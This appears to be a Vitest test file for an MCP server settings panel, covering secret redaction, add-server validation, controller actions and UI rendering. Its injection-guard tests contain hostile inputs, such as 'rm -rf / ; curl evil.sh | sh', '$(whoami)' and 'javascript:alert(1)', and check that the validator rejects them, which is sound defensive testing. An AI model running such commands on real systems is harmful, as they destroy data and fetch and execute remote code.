import {
  act,
  fireEvent,
  render,
  renderHook,
  screen,
  waitFor,
  within,
} from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import {
  McpServersController,
  authMeta,
  emptyDraft,
  filterServers,
  hasAvailableTools,
  isLocalSubprocess,
  isValidHttpUrl,
  parseMcpServer,
  redactedEnv,
  redactedHeaders,
  serverArgs,
  serverHaystack,
  statusMeta,
  transportMeta,
  useMcpServersController,
  validateDraft,
  type HermesMcpServerInfo,
  type McpServerDraft,
  type McpServersEngine,
  type McpServersState,
} from "../lib/hermes-admin";
import { McpServersView } from "../components/settings/McpServersSection";
import { makeAdminHarness } from "./fixtures/hermes-admin-harness";
import {
  mcpBadCommandScenario,
  mcpNoServersScenario,
  mcpOAuthAuthMissingScenario,
  mcpStdioWithToolsScenario,
} from "./fixtures/hermes-admin-scenarios";

/** Builds a HermesMcpServerInfo by parsing a wire-shaped object so raw-reading
 * view helpers see exactly what the client would hand them. */
function serverFromWire(raw: Record<string, unknown>): HermesMcpServerInfo {
  const server = parseMcpServer(raw);
  if (!server) throw new Error("fixture did not parse");
  return server;
}

// ---------------------------------------------------------------------------
// Pure view logic: transport / auth / status labels, redaction, search.
// ---------------------------------------------------------------------------

describe("mcp servers — view logic", () => {
  it("labels transports with explicit local-subprocess vs remote-http risk", () => {
    expect(transportMeta("stdio").risk).toBe("local-subprocess");
    expect(transportMeta("stdio").riskLabel).toBe("Local subprocess");
    expect(transportMeta("http").risk).toBe("remote-http");
    expect(transportMeta("http-oauth").risk).toBe("remote-http");
    // No dashes in any of the copy.
    for (const t of ["stdio", "http", "http-oauth", "unknown"] as const) {
      expect(transportMeta(t).blurb).not.toMatch(/[–—]/);
      expect(transportMeta(t).label).not.toMatch(/[–—]/);
    }
  });

  it("maps auth and status to sentence-case labels with a tone", () => {
    expect(authMeta("unauthenticated")).toEqual({
      label: "Not signed in",
      tone: "attention",
    });
    expect(authMeta("authenticated").tone).toBe("ok");
    expect(statusMeta("connected").tone).toBe("ok");
    expect(statusMeta("error").tone).toBe("error");
    expect(statusMeta(undefined).label).toBe("Not tested");
  });

  it("redacts env and header KEY names only, never values", () => {
    const stdio = serverFromWire({
      name: "sqlite",
      transport: "stdio",
      command: "mcp-server-sqlite",
      env: { SQLITE_KEY: "super-secret-value" },
    });
    const env = redactedEnv(stdio);
    expect(env).toEqual([{ key: "SQLITE_KEY", display: "Hidden" }]);
    // The secret value must not appear anywhere in the redacted summary.
    expect(JSON.stringify(env)).not.toContain("super-secret-value");

    const http = serverFromWire({
      name: "linear",
      transport: "http",
      url: "https://mcp.linear.app",
      headers: { Authorization: "Bearer tok_abcdef" },
    });
    const headers = redactedHeaders(http);
    expect(headers).toEqual([{ key: "Authorization", display: "Hidden" }]);
    expect(JSON.stringify(headers)).not.toContain("tok_abcdef");
  });

  it("reads stdio args and flags local subprocesses", () => {
    const stdio = serverFromWire({
      name: "fs",
      transport: "stdio",
      command: "mcp-server-filesystem",
      args: ["--root", "/tmp"],
    });
    expect(serverArgs(stdio)).toEqual(["--root", "/tmp"]);
    expect(isLocalSubprocess(stdio)).toBe(true);

    const http = serverFromWire({
      name: "gh",
      transport: "http",
      url: "https://api.example.com/mcp",
    });
    expect(isLocalSubprocess(http)).toBe(false);
  });

  it("searches by name, command, url, and tool names", () => {
    const servers = [
      serverFromWire({
        name: "sqlite",
        transport: "stdio",
        command: "mcp-server-sqlite",
        tools: [{ name: "query" }],
      }),
      serverFromWire({
        name: "linear",
        transport: "http",
        url: "https://mcp.linear.app",
      }),
    ];
    expect(filterServers(servers, "query").map((s) => s.name)).toEqual([
      "sqlite",
    ]);
    expect(filterServers(servers, "linear.app").map((s) => s.name)).toEqual([
      "linear",
    ]);
    expect(serverHaystack(servers[0])).toContain("query");
  });

  it("treats a server as having available tools only when enabled with active tools", () => {
    const enabledWithTools = serverFromWire({
      name: "a",
      enabled: true,
      transport: "stdio",
      command: "x",
      tools: [{ name: "t1", enabled: true }],
    });
    expect(hasAvailableTools(enabledWithTools)).toBe(true);

    const disabled = serverFromWire({
      name: "b",
      enabled: false,
      transport: "stdio",
      command: "x",
      tools: [{ name: "t1", enabled: true }],
    });
    expect(hasAvailableTools(disabled)).toBe(false);

    const noTools = serverFromWire({
      name: "c",
      enabled: true,
      transport: "stdio",
      command: "x",
    });
    expect(hasAvailableTools(noTools)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Add-server draft validation: name + shell/path-injection prevention.
// ---------------------------------------------------------------------------

describe("mcp servers — add-server validation", () => {
  function stdioDraft(over: Partial<McpServerDraft> = {}): McpServerDraft {
    return {
      ...emptyDraft("stdio"),
      name: "my-server",
      command: "cmd",
      ...over,
    };
  }

  it("accepts a valid stdio draft and builds a minimal payload", () => {
    const result = validateDraft(
      stdioDraft({
        command: "mcp-server-filesystem",
        args: ["--root", "/tmp"],
        env: [{ key: "API_KEY", value: "secret" }],
      }),
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.payload).toEqual({
        name: "my-server",
        command: "mcp-server-filesystem",
        args: ["--root", "/tmp"],
        env: { API_KEY: "secret" },
      });
    }
  });

  it("accepts a valid http draft with auth and headers", () => {
    const result = validateDraft({
      ...emptyDraft("http"),
      name: "linear",
      url: "https://mcp.linear.app/sse",
      auth: "oauth",
      headers: [{ key: "X-Trace", value: "1" }],
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.payload).toEqual({
        name: "linear",
        url: "https://mcp.linear.app/sse",
        auth: "oauth",
        headers: { "X-Trace": "1" },
      });
    }
  });

  it("rejects an empty or malformed name", () => {
    expect(validateDraft(stdioDraft({ name: "" })).ok).toBe(false);
    const bad = validateDraft(stdioDraft({ name: "bad name!" }));
    expect(bad.ok).toBe(false);
    if (!bad.ok) expect(bad.errors.name).toBeTruthy();
  });

  it("rejects shell metacharacters in the command (injection guard)", () => {
    const result = validateDraft(
      stdioDraft({ command: "rm -rf / ; curl evil.sh | sh" }),
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.errors.command).toMatch(/shell/i);
  });

  it("rejects shell metacharacters in an argument", () => {
    const result = validateDraft(
      stdioDraft({ command: "ok", args: ["fine", "$(whoami)"] }),
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.errors["args.1"]).toBeTruthy();
  });

  it("rejects a non-identifier env key", () => {
    const result = validateDraft(
      stdioDraft({ env: [{ key: "bad-key;rm", value: "x" }] }),
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.errors["env.0"]).toBeTruthy();
  });

  it("rejects an invalid URL for http transport", () => {
    expect(isValidHttpUrl("not a url")).toBe(false);
    expect(isValidHttpUrl("ftp://x")).toBe(false);
    expect(isValidHttpUrl("https://ok.example.com")).toBe(true);
    const result = validateDraft({
      ...emptyDraft("http"),
      name: "x",
      url: "javascript:alert(1)",
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.errors.url).toBeTruthy();
  });

  it("ignores wholly blank env/header rows", () => {
    const result = validateDraft(stdioDraft({ env: [{ key: "", value: "" }] }));
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.payload.env).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Controller mutations against the real client + fake server.
// ---------------------------------------------------------------------------

describe("mcp servers — controller", () => {
  it("loads servers and exposes transport / status metadata", async () => {
    const harness = makeAdminHarness(mcpStdioWithToolsScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();

    const snapshot = controller.getSnapshot();
    expect(snapshot.status).toBe("ready");
    const sqlite = snapshot.servers.find((s) => s.name === "sqlite");
    expect(sqlite?.transport).toBe("stdio");
    // The GET never echoes the secret env back.
    expect(JSON.stringify(snapshot.servers)).not.toContain("SQLITE_KEY-secret");

    controller.dispose();
  });

  it("enables a server, advances the banner to restart-required, and notifies", async () => {
    const harness = makeAdminHarness(mcpStdioWithToolsScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();

    // Disable first so we can re-enable and observe the mutation.
    await controller.setEnabled("sqlite", false);
    expect(
      controller.getSnapshot().servers.find((s) => s.name === "sqlite")
        ?.enabled,
    ).toBe(false);

    const snapshot = controller.getSnapshot();
    expect(snapshot.lifecycle.state).toBe("gateway-restart-required");
    expect(snapshot.notifications.at(-1)?.timing).toBe("gateway-restart");
    expect(snapshot.notifications.at(-1)?.message).toMatch(/restart/i);

    controller.dispose();
  });

  it("rolls back an optimistic toggle and surfaces a safe error on failure", async () => {
    const harness = makeAdminHarness(mcpStdioWithToolsScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();

    vi.spyOn(harness.client.mcp, "setEnabled").mockRejectedValueOnce(
      new Error("boom"),
    );
    await controller.setEnabled("sqlite", false);

    const snapshot = controller.getSnapshot();
    // Rolled back to the real (still enabled) state.
    expect(snapshot.servers.find((s) => s.name === "sqlite")?.enabled).toBe(
      true,
    );
    expect(snapshot.pending.size).toBe(0);
    expect(snapshot.error).toBeTruthy();

    controller.dispose();
  });

  it("tests a server and stores discovered tools", async () => {
    const harness = makeAdminHarness(mcpStdioWithToolsScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();

    const state = await controller.test("sqlite");
    expect(state.result?.ok).toBe(true);
    expect(state.result?.tools?.map((t) => t.name)).toEqual([
      "query",
      "execute",
      "schema",
    ]);
    expect(controller.getSnapshot().tests.get("sqlite")?.result?.ok).toBe(true);

    controller.dispose();
  });

  it("surfaces a clear error from a failing test probe", async () => {
    const harness = makeAdminHarness(mcpBadCommandScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();

    const state = await controller.test("broken");
    // The probe connected to Hermes but reported ok: false with a safe message.
    expect(state.result?.ok).toBe(false);
    expect(state.result?.message).toMatch(/command not found/i);

    controller.dispose();
  });

  it("adds a server through the real client and refreshes the list", async () => {
    const harness = makeAdminHarness(mcpNoServersScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();
    expect(controller.getSnapshot().servers).toHaveLength(0);

    const ok = await controller.add({
      name: "fs",
      command: "mcp-server-filesystem",
      env: { TOKEN: "shh" },
    });
    expect(ok).toBe(true);

    const snapshot = controller.getSnapshot();
    expect(snapshot.servers.map((s) => s.name)).toContain("fs");
    expect(snapshot.lifecycle.state).toBe("gateway-restart-required");
    // The fake server stores but never echoes the env secret back.
    expect(JSON.stringify(snapshot.servers)).not.toContain("shh");

    controller.dispose();
  });

  it("removes a server through the real client", async () => {
    const harness = makeAdminHarness(mcpStdioWithToolsScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();

    const ok = await controller.remove("sqlite");
    expect(ok).toBe(true);
    expect(controller.getSnapshot().servers).toHaveLength(0);

    controller.dispose();
  });

  it("never logs secret env/header values through the transport logger", async () => {
    const harness = makeAdminHarness(mcpNoServersScenario());
    const controller = new McpServersController(harness as McpServersEngine);
    await controller.load();
    await controller.add({
      name: "secret-server",
      command: "cmd",
      env: { API_KEY: "sk-do-not-log-this-secret" },
    });

    const logBlob = JSON.stringify(harness.logs);
    expect(logBlob).not.toContain("sk-do-not-log-this-secret");

    controller.dispose();
  });
});

// ---------------------------------------------------------------------------
// Hook binding + profile isolation regression.
// ---------------------------------------------------------------------------

describe("mcp servers — useMcpServersController", () => {
  it("loads on mount and reflects an add through the snapshot", async () => {
    const harness = makeAdminHarness(mcpNoServersScenario());
    const { result } = renderHook(() =>
      useMcpServersController(harness as McpServersEngine),
    );
    await waitFor(() => expect(result.current.status).toBe("ready"));

    await act(async () => {
      await result.current.add({ name: "fs", command: "x" });
    });
    expect(result.current.servers.map((s) => s.name)).toContain("fs");
  });

  it("returns the unavailable state for a null engine", () => {
    const { result } = renderHook(() => useMcpServersController(null));
    expect(result.current.status).toBe("unavailable");
    expect(result.current.servers).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Component view: rows, search, test, toggle, delete confirm, empty states.
// ---------------------------------------------------------------------------

const BASE_LIFECYCLE: McpServersState["lifecycle"] = {
  state: "clean",
  label: "Up to date",
  detail: "No pending changes.",
  canRestart: false,
};

function stubState(overrides: Partial<McpServersState> = {}): McpServersState {
  return {
    status: "ready",
    servers: [],
    mode: "sandboxed",
    profile: "default",
    pending: new Set<string>(),
    tests: new Map(),
    adding: false,
    retryable: false,
    lifecycle: BASE_LIFECYCLE,
    notifications: [],
    refresh: vi.fn(),
    setEnabled: vi.fn(),
    test: vi.fn(() => Promise.resolve({ pending: false })),
    add: vi.fn(() => Promise.resolve(true)),
    remove: vi.fn(() => Promise.resolve(true)),
    dismissNotification: vi.fn(),
    ...overrides,
  };
}

const VIEW_SERVERS: HermesMcpServerInfo[] = [
  serverFromWire({
    name: "sqlite",
    enabled: true,
    transport: "stdio",
    command: "mcp-server-sqlite",
    args: ["--db", "./data.db"],
    status: "connected",
    auth_status: "not-required",
    env: { SQLITE_KEY: "secret-value-never-shown" },
    tools: [{ name: "query", enabled: true }],
  }),
  serverFromWire({
    name: "linear",
    enabled: true,
    transport: "http-oauth",
    url: "https://mcp.linear.app/sse",
    auth_status: "unauthenticated",
    status: "error",
    status_message: "Not authenticated.",
  }),
];

describe("McpServersView — component", () => {
  it("lists servers with transport, risk, and status, and redacts secrets", () => {
    render(<McpServersView state={stubState({ servers: VIEW_SERVERS })} />);
    expect(screen.getByText("sqlite")).toBeInTheDocument();
    expect(screen.getByText("linear")).toBeInTheDocument();

    const sqliteRow = within(
      screen.getByText("sqlite").closest("li") as HTMLElement,
    );
    expect(sqliteRow.getByText("Local (stdio)")).toBeInTheDocument();
    expect(sqliteRow.getByText("Local subprocess")).toBeInTheDocument();
    expect(sqliteRow.getByText("Connected")).toBeInTheDocument();
    // The redacted env summary shows a count, never the value.
    expect(sqliteRow.getByText(/Environment: 1 hidden/)).toBeInTheDocument();
    expect(
      screen.queryByText(/secret-value-never-shown/),
    ).not.toBeInTheDocument();

    const linearRow = within(
      screen.getByText("linear").closest("li") as HTMLElement,
    );
    expect(linearRow.getByText("Remote (OAuth)")).toBeInTheDocument();
    expect(linearRow.getByText("Not signed in")).toBeInTheDocument();
    expect(linearRow.getByText("Connection error")).toBeInTheDocument();
  });

  it("filters servers by the search box", () => {
    render(<McpServersView state={stubState({ servers: VIEW_SERVERS })} />);
    const search = screen.getByRole("searchbox", {
      name: /filter mcp servers/i,
    });
    fireEvent.change(search, { target: { value: "linear" } });
    expect(screen.getByText("linear")).toBeInTheDocument();
    expect(screen.queryByText("sqlite")).not.toBeInTheDocument();
  });

  it("calls setEnabled when a toggle is flipped", () => {
    const setEnabled = vi.fn();
    render(
      <McpServersView
        state={stubState({ servers: VIEW_SERVERS, setEnabled })}
      />,
    );
    const switches = screen.getAllByRole("switch");
    fireEvent.click(switches[0]); // sqlite is enabled -> disable
    expect(setEnabled).toHaveBeenCalledWith("sqlite", false);
  });

  it("calls test when the Test button is clicked", () => {
    const test = vi.fn(() => Promise.resolve({ pending: false }));
    render(
      <McpServersView state={stubState({ servers: VIEW_SERVERS, test })} />,
    );
    const sqliteRow = within(
      screen.getByText("sqlite").closest("li") as HTMLElement,
    );
    fireEvent.click(sqliteRow.getByRole("button", { name: /^test$/i }));
    expect(test).toHaveBeenCalledWith("sqlite");
  });

  it("shows discovered tools after a successful test", () => {
    const tests = new Map([
      [
        "sqlite",
        {
          pending: false,
          result: {
            name: "sqlite",
            ok: true,
            tools: [{ name: "query" }, { name: "execute" }],
            raw: {},
          },
        },
      ],
    ]);
    render(
      <McpServersView state={stubState({ servers: VIEW_SERVERS, tests })} />,
    );
    const sqliteRow = within(
      screen.getByText("sqlite").closest("li") as HTMLElement,
    );
    expect(sqliteRow.getByText(/Discovered 2 tools/)).toBeInTheDocument();
    expect(sqliteRow.getByText("execute")).toBeInTheDocument();
  });

  it("opens a delete confirmation that warns when tools are available", async () => {
    render(<McpServersView state={stubState({ servers: VIEW_SERVERS })} />);
    const sqliteRow = within(
      screen.getByText("sqlite").closest("li") as HTMLElement,
    );
    fireEvent.click(sqliteRow.getByRole("button", { name: /delete sqlite/i }));
    await waitFor(() =>
      expect(screen.getByText(/currently exposes tools/i)).toBeInTheDocument(),
    );
  });

  it("opens the add-server dialog and validates before sending", async () => {
    const add = vi.fn(() => Promise.resolve(true));
    render(<McpServersView state={stubState({ add })} />);
    fireEvent.click(screen.getByRole("button", { name: /add server/i }));

    await waitFor(() =>
      expect(screen.getByText("Add MCP server")).toBeInTheDocument(),
    );
    // Submitting with a blank name surfaces an error and does not send.
    const submit = screen.getAllByRole("button", { name: /add server/i });
    fireEvent.click(submit[submit.length - 1]);
    expect(add).not.toHaveBeenCalled();
    expect(screen.getByText(/enter a name/i)).toBeInTheDocument();
  });

  it("shows the Hermes-not-running surface when unavailable", () => {
    render(<McpServersView state={stubState({ status: "unavailable" })} />);
    expect(screen.getByText("Hermes is not running")).toBeInTheDocument();
    expect(
      screen.getByRole("searchbox", { name: /filter mcp servers/i }),
    ).toBeDisabled();
  });

  it("shows the no-servers empty state for an empty ready list", () => {
    render(<McpServersView state={stubState({ servers: [] })} />);
    expect(screen.getByText("No MCP servers")).toBeInTheDocument();
  });

  it("shows an inline error with retry when the load failed", () => {
    const refresh = vi.fn();
    render(
      <McpServersView
        state={stubState({
          status: "error",
          error: "Could not reach Hermes.",
          retryable: true,
          refresh,
        })}
      />,
    );
    expect(screen.getByText("Could not reach Hermes.")).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: /try again/i }));
    expect(refresh).toHaveBeenCalled();
  });

  it("renders the restart-required lifecycle banner when a change is pending", () => {
    render(
      <McpServersView
        state={stubState({
          servers: VIEW_SERVERS,
          lifecycle: {
            state: "gateway-restart-required",
            label: "Restart required",
            detail: "Restart the Hermes gateway to apply your changes.",
            canRestart: true,
          },
        })}
      />,
    );
    expect(screen.getByText("Restart required")).toBeInTheDocument();
  });
});

// ---------------------------------------------------------------------------
// Profile isolation: two targets key their caches differently.
// ---------------------------------------------------------------------------

describe("mcp servers — profile isolation", () => {
  it("does not let one runtime's servers read under another's cache key", async () => {
    const sandboxed = makeAdminHarness(mcpStdioWithToolsScenario(), {
      mode: "sandboxed",
    });
    const unrestricted = makeAdminHarness(mcpOAuthAuthMissingScenario(), {
      mode: "unrestricted",
    });
    expect(sandboxed.cache.keyFor("mcpServers")).not.toBe(
      unrestricted.cache.keyFor("mcpServers"),
    );
  });
});
